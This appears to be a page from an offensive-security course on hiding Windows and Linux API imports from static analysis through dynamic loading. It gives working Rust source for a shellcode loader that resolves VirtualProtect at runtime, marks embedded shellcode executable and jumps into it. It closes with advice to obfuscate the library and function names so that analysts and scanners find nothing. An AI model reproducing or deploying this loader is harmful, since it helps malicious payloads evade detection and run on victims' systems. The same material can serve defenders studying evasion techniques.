+++
title = "Dynamic imports"
weight = 5
+++

The technique of dynamic module import, which is cross-platform for both Windows and Linux, involves dynamically loading external libraries at runtime. This way, we obfuscate the use of certain functionalities during static analysis.

To quickly understand how a static analyst reads our dynamic function calls, it is important to know that the functions we call are stored in specific places in our binaries:

- On Windows, which uses the PE format, the called functions are stored in the IAT (Import Address Table), which is a data structure that contains the list of function addresses.
- On Linux, which uses the ELF format, the called functions are stored in the GOT (Global Offset Table), which contains the list of function addresses from dynamic libraries.

For our example, we will reuse the shellcode loader we developed earlier in the course and obfuscate the call to the `VirtualProtect` function on Windows (the code is fully compatible with Linux to obfuscate the call to the `mprotect` function):

```
.
├── Cargo.lock
├── Cargo.toml
└── src
    ├── main.rs
    └── shellcode.bin
```

```rust
use libloading::{Library, Symbol};
use std::mem;

const SHELLCODE: &[u8] = include_bytes!("shellcode.bin");

fn main() {
    let map = Box::new(SHELLCODE);
    let mut old_p = 0;

    unsafe {
        let lib = Library::new("kernel32.dll").unwrap();
        let virtual_protect = lib
            .get::<Symbol<extern "stdcall" fn(*const (), usize, u32, *mut u32)>>(b"VirtualProtect")
            .unwrap();

        virtual_protect(map.as_ptr() as *mut (), map.len(), 32, &mut old_p);

        let exec_shellcode: extern "C" fn() -> ! = mem::transmute(map.as_ptr());
        exec_shellcode();
    }
}
```

In this implementation, we start by using the `libloading` dependency, which we have already used in a previous part of the course. It is a great wrapper around the Windows API because it uses the famous `LoadLibraryA` and `GetProcAddress` functions under the hood. (On Linux, it uses the `dlopen` and `dlsym` functions)

Next, we load the "kernel32.dll" library into memory, which contains most of the Windows API functions, including the "VirtualProtect" function that we are interested in.

Now, we find the address of our function by its name and apply its prototype `extern "stdcall" fn(*const (), usize, u32, *mut u32)`, which we extracted from the official function documentation. This will return a function pointer in the `virtual_protect` variable.

## Conclusion

We can now call our `virtual_protect` function as if we had imported it normally, without its address being present in the IAT or GOT.

It is also advisable to obfuscate the strings `kernel32.dll` and `VirtualProtect` to further complicate static analysis.
